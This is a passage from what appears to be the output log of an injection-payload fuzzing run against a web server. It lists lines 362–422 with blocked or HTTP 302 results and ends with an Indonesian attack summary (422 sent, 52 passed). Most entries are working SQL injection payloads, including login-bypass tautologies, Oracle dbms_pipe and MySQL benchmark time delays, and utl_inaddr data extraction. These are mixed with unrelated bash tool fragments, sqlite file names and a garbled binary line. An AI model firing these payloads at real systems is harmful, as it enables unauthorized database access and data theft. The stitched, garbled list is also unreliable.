+[362/424] if [[ "$status1" != "200" && "$status1" == "$status999" && " [DROP] BLOCKED/DROPPED (timeout)
+[363/424] iu=".child node: ---"                                        [DROP] BLOCKED/DROPPED (timeout)
+[364/424] if [ true = "$Z" ] ; then echo "DEBUG! encoder input: $input [DROP] BLOCKED/DROPPED (timeout)
+[365/424] ((lendiff=$lengthselY-$lengthselN))                          [WARN] HTTP 302
+[366/424] 4,run-590.sqlite                                             [WARN] HTTP 302
+[367/424] 8,run-59.sqlite                                              [WARN] HTTP 302
+[368/424] echo -e '\E[31;48m'"\033[1m[TIME-DELAY-"$time_diff"SEC $dbms [DROP] BLOCKED/DROPPED (timeout)
+[369/424] \\' or \\'xyz\\'=\\'xyz\\' --                                [DROP] BLOCKED/DROPPED (timeout)
+[370/424] 4,run-726.sqlite                                             [WARN] HTTP 302
+[371/424] echo "Some examples are: -s, -n, -q, -r, -e, -b, -C" >&2     [DROP] BLOCKED/DROPPED (timeout)
+[372/424] 1,safari-partial.sqlite                                      [WARN] HTTP 302
+[373/424] 8,run-22.sqlite                                              [WARN] HTTP 302
+[374/424] admin" or "1"="1                                             [DROP] BLOCKED/DROPPED (timeout)
+[375/424] \\n\\' or 1337=dbms_pipe.receive_message(1,120) --           [DROP] BLOCKED/DROPPED (timeout)
+[376/424] ' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(U [DROP] BLOCKED/DROPPED (timeout)
+[377/424] elif [[ $dbms == "oracle" ]] ; then                          [DROP] BLOCKED/DROPPED (timeout)
+[378/424] echo -n "$char" >> ./listofxpathelements.txt                 [DROP] BLOCKED/DROPPED (timeout)
+[379/424] 8,run-86.sqlite                                              [WARN] HTTP 302
+[380/424] ???'??ƥ???m?/ܩ??%d?"Ռ(d?2?E?A??(????'???+? ύ??B???? [DROP] BLOCKED/DROPPED (timeout)
+[381/424] 1,storage-sync.sqlite                                        [DROP] BLOCKED/DROPPED (timeout)
+[382/424] " or "a"="a                                                  [DROP] BLOCKED/DROPPED (timeout)
+[383/424] " or ""&"                                                    [DROP] BLOCKED/DROPPED (timeout)
+[384/424] %0d%0a and 1337=dbms_pipe.receive_message(('a'),120)         [DROP] BLOCKED/DROPPED (timeout)
+[385/424] ')) and 0=benchmark(3000000,MD5(1)) #                        [DROP] BLOCKED/DROPPED (timeout)
+[386/424] \\r\\n;select case when 20=20 then 'a'||dbms_pipe.receive_me [DROP] BLOCKED/DROPPED (timeout)
+[387/424] )%20or%20('x'='x                                             [DROP] BLOCKED/DROPPED (timeout)
+[388/424] )) and 0=benchmark(3000000,MD5(1)) #                         [DROP] BLOCKED/DROPPED (timeout)
+[389/424] if [[ true = "$n" || true = "$s" || true = "$e" || true = "$ [DROP] BLOCKED/DROPPED (timeout)
+[390/424] ; exec ('sel' + 'ect us' + 'er')                             [DROP] BLOCKED/DROPPED (timeout)
+[391/424] 4,run-111.sqlite                                             [WARN] HTTP 302
+[392/424] 4,run-608.sqlite                                             [WARN] HTTP 302
+[393/424] 4,run-459.sqlite                                             [WARN] HTTP 302
+[394/424] 1,bio-fake.sqlite3                                           [DROP] BLOCKED/DROPPED (timeout)
+[395/424] ';                                                           [DROP] BLOCKED/DROPPED (timeout)
+[396/424] echo "Attempting to brute force $findme. If you get bored hi [DROP] BLOCKED/DROPPED (timeout)
+[397/424] 1,-sqlite.sqlite3                                            [DROP] BLOCKED/DROPPED (timeout)
+[398/424] admin' or '1'='1'--                                          [DROP] BLOCKED/DROPPED (timeout)
+[399/424] echo "[ORDER BY: $colno COL REQ:$K] $request" >> ./output/$s [DROP] BLOCKED/DROPPED (timeout)
+[400/424] 4,run-623.sqlite                                             [WARN] HTTP 302
+[401/424] if [[ $oflag == "1" ]] ; then #this routine gets run once at [DROP] BLOCKED/DROPPED (timeout)
+[402/424] 8,run-25.sqlite                                              [WARN] HTTP 302
+[403/424] 1,db-PORT-ZOMPARELLI.sqlite3                                 [DROP] BLOCKED/DROPPED (timeout)
+[404/424] ' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(c [DROP] BLOCKED/DROPPED (timeout)
+[405/424] /**/                                                         [DROP] BLOCKED/DROPPED (timeout)
+[406/424] 6,token-version-1.5.sqlite                                   [WARN] HTTP 302
+[407/424] if [[ $lendiff -gt 6 || $lendiff -lt -6 ]] ; then            [WARN] HTTP 302
+[408/424] 4,run-425.sqlite                                             [WARN] HTTP 302
+[409/424] rbuff="/*[$xcount]"                                          [DROP] BLOCKED/DROPPED (timeout)
+[410/424] 4,run-555.sqlite                                             [WARN] HTTP 302
+[411/424] ') or ('x')=('x                                              [DROP] BLOCKED/DROPPED (timeout)
+[412/424] p) # hash + noise + newline                                  [DROP] BLOCKED/DROPPED (timeout)
+[413/424] ' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_ [DROP] BLOCKED/DROPPED (timeout)
+[414/424] quote="'"                                                    [DROP] BLOCKED/DROPPED (timeout)
+[415/424] 1,pi-ager.sqlite3                                            [WARN] HTTP 302
+[416/424] ')) or benchmark(10000000,MD5(1))#                           [DROP] BLOCKED/DROPPED (timeout)
+[417/424] \n' or 1337=dbms_pipe.receive_message(1,120) --              [DROP] BLOCKED/DROPPED (timeout)
+[418/424] or 1/*                                                       [DROP] BLOCKED/DROPPED (timeout)
+[419/424] '),(select if(count(*)!=-1,benchmark(3000000,MD5(1)),benchma [DROP] BLOCKED/DROPPED (timeout)
+[420/424] stringlength=${#uriinputdecode}                              [DROP] BLOCKED/DROPPED (timeout)
+[421/424] xp="conditionalstring"                                       [DROP] BLOCKED/DROPPED (timeout)
+[422/424] 1,tub-bourg.sqlite3                                          [DROP] BLOCKED/DROPPED (timeout)
+
+--------------------------------------------------------
+  RINGKASAN SERANGAN:
+  Total Payload Dikirim : 422
+  Diblokir (DROP/timeout): 370
+  Lolos ke server       : 52
+--------------------------------------------------------
+
